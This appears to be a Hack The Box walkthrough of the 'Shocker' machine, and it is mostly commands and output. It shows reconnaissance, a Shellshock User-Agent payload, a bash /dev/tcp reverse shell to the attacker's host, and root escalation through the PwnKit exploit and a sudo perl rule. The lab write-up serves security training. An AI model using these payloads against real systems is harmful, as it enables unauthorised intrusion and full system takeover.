---
layout: single
title: Shocker  - Hack The Box
excerpt: "Shocker, while fairly simple overall, demonstrates the severity of the renowned Shellshock exploit, which affected millions of public-facing servers."
date: 2025-06-04
classes: wide
header:
  teaser: /img2/shocker.PNG
  teaser_home_page: true
  icon: /img2/images/hackthebox.webp
categories:
  - hackthebox
  - Linux
  - Easy
tags:
  - ShellShock Attack (User-Agent)
  - Execution After Redirect (EAR) Vulnerability - Skipping Redirects
  - SUID Binary Exploitation [Privilege Escalation] (OPTION 1)
  - Abusing Sudoers Privilege (Perl) (OPTION 2)
---


## Reconnaissance

- Nmap

```bash
❯ nmap -sS --open -p- --min-rate 5000 -vvv -n -Pn 10.10.10.56
```

```php
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-04 09:40 CEST
Initiating SYN Stealth Scan at 09:40
Scanning 10.10.10.56 [65535 ports]
Discovered open port 80/tcp on 10.10.10.56
Discovered open port 2222/tcp on 10.10.10.56
Completed SYN Stealth Scan at 09:41, 26.64s elapsed (65535 total ports)
Nmap scan report for 10.10.10.56
Host is up, received user-set (0.22s latency).
Scanned at 2025-06-04 09:40:50 CEST for 27s
Not shown: 52806 closed tcp ports (reset), 12727 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE      REASON
80/tcp   open  http         syn-ack ttl 63
2222/tcp open  EtherNetIP-1 syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.79 seconds
           Raw packets sent: 130256 (5.731MB) | Rcvd: 59251 (2.370MB)
```

- Vulnerability and version scan

```bash
❯ nmap -sCV -p2222 -vvv 10.10.10.56
```

```php
PORT     STATE SERVICE REASON         VERSION
2222/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREGCpS2WC3NhAKQ2zefCHCU8XTC8hY9ta5ocU+p7S52OGHlaG7HuA5Xlnihl1INNsMX7gpNcfQEYnyby+hjHWPLo4++fAyO/lB8NammyA13MzvJy8pxvB9gmCJhVPaFzG5yX6Ly8OIsvVDk+qVa5eLCIua1E7WGACUlmkEGljDvzOaBdogMQZ8TGBTqNZbShnFH1WsUxBtJNRtYfeeGjztKTQqqj4WD5atU8dqV/iwmTylpE7wdHZ+38ckuYL9dmUPLh4Li2ZgdY6XniVOBGthY5a2uJ2OFp2xe1WS9KvbYjJ/tH
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiFJd2F35NPKIQxKMHrgPzVzoNHOJtTtM+zlwVfxzvcXPFFuQrOL7X6Mi9YQF9QRVJpwtmV9KAtWltmk3qm4oc=
|   256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/RjKhT/2YPlCgFQLx+gOXhC6W3A3raTzjlXQMT8Msk
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:42
Completed NSE at 09:42, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:42
Completed NSE at 09:42, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:42
Completed NSE at 09:42, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 3.72 seconds
           Raw packets sent: 5 (196B) | Rcvd: 2 (72B)
```

- Gobuster

```bash
❯ gobuster dir -u http://10.10.10.56/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 --add-slash
```

```php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.56/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/cgi-bin/             (Status: 403) [Size: 294]
/icons/               (Status: 403) [Size: 292]
```

- Search bash scripts in /cgi-bin

```bash
❯ gobuster dir -u http://10.10.10.56/cgi-bin/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50  -x sh
```

```php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.56/cgi-bin/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              sh
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/user.sh              (Status: 200) [Size: 119]
```

![](/img2/Pasted%20image%2020250604102511.png)

![](/img2/Pasted%20image%2020250604102548.png)

> User.sh is executing uptime command in real time, we can see how time changes

## Exploitation

- Shellsock

```bash
❯ curl -s http://10.10.10.56/cgi-bin/user.sh -H "User-Agent: () { :; }; echo; /usr/bin/whoami"
```

```php
shelly
```

- Reverse shell

```bash
❯ curl -s http://10.10.10.56/cgi-bin/user.sh -H "User-Agent: () { :; };  /bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.16.7/9000 0>&1'"
```

```bash
❯ nc -nlvp 9000
```

## Post-exploitation (OPTION 1)

- Find sudoers

```bash
shelly@Shocker:/tmp$ find / -perm -4000 2>/dev/null
```

```php
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/at
/usr/bin/newgrp
/usr/bin/newgidmap
/usr/bin/pkexec  
/usr/bin/newuidmap
/bin/ping6
/bin/su
/bin/fusermount
/bin/ntfs-3g
/bin/umount
/bin/ping
/bin/mount
```

- CVE-2021-4034 (Pkexec Local Privilege Escalation)

```bash
wget https://github.com/ly4k/PwnKit/blob/main/PwnKit.c
python3 -m http.server
```

```bash
wget http://10.10.16.7/PwnKit.c
gcc -shared PwnKit.c -o PwnKit -Wl,-e,entry -fPIC
./PwnKit
```

## Post-explotation (OPTION 2)

- Check sudoers

```bash
shelly@Shocker:/tmp$ sudo -l
```

```php
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

- Exploit perl sudoers

```bash
shelly@Shocker:/tmp$ sudo perl -e 'exec "/bin/bash";'  
```

```php
root@Shocker:/tmp# 
```


![](/img2/Pasted%20image%2020250604104043.png)